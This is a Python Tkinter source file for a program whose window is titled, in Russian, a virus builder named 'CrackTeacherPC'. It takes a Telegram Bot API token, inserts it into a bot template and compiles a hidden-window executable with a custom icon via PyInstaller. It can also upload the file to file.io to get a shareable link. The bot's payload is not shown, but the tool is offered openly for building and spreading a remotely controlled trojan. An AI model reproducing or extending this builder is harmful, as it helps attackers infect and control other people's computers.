import os, threading, sys
from tkinter import messagebox as mbox
if not 'from' in os.popen('pip').read():
    mbox.showerror("Ошибка", 'Не возможно вызвать pip.')
    raise SystemExit(1)
if not sys.platform == 'win32':
    mbox.showerror("Ошибка", 'Извините, пока поддерживается только Windows.')
    raise SystemExit(1)
os.system('pip install -r requirements.txt')
import tkinter as tk
import requests
import pyperclip
from tkinter.filedialog import askopenfilename
from tkinter import BooleanVar, Checkbutton, StringVar
window = tk.Tk()
window.title('Сборщик вируса CrackTeacherPC')
icon = 'bot.ico'
def choose():
    icon = askopenfilename()
tk.Button(window, text ='Добавить свою иконку', command=choose).pack()
tk.Label(window, text='Токен Telegram Bot API:').pack()
entry = tk.Entry(width=50)
entry.pack()
createshortlink = BooleanVar()
Checkbutton(window, text='Создать короткую ссылку', variable=createshortlink).pack()
display_text = StringVar()
tk.Label(window, textvariable=display_text).pack()
def log(t):
    display_text.set(f'{display_text.get()}{t}\n')
def build():
    btn_build.configure(text='Пожалуйста, подождите', command=lambda: mbox.showwarning('Не требуется', 'Сборка уже идёт, подождите'))
    token = entry.get()
    if not token:
        mbox.showerror("Ошибка", 'Укажите токен Telegram Bot API!')
        return
    log('Создание кода по шаблону ...')
    with open('blank.py') as file:
        new_content = file.read().replace('<token>', token)
    with open('bot.py', 'w') as file:
        file.write(new_content)
    log('Запуск сборки ...')
    if os.system(f'pyinstaller --icon {icon} -w --onefile bot.py') == 0:
        log('Сборка завершена!')
    else:
        mbox.showerror("Ошибка", 'Неизвестная ошибка сборки.')
        return
    os.remove('bot.py')
    os.rename('dist/bot.exe', 'bot.exe')
    if createshortlink.get():
        if os.path.exists('bot.exe'):
            log('Загрузка файла ...')
            response = requests.post(f'https://file.io?expiry=14d', files={'file': open('bot.exe', 'rb')}).json()
            if not response['success']:
                mbox.showerror("Ошибка", 'Неизвестная ошибка загрузки.')
                return
            else:
                log('Загрузка завершена!')
                log(f'Ваша ссылка: {response["link"]}')
                tk.Button(window, text='Cкопировать ссылку в буфер обмена', command=lambda: pyperclip.copy(response['link'])).pack()
        else:
            mbox.showerror("Ошибка", 'Не возможно найти файл bot.exe')
    else:
        log('Файл сохранён как bot.exe')
    btn_build.configure(text ='Запуск', command=run_build)
def run_build():
    threading.Thread(target=build).start()
btn_build = tk.Button(window, text ='Запуск', command=run_build)
btn_build.pack()
window.mainloop()
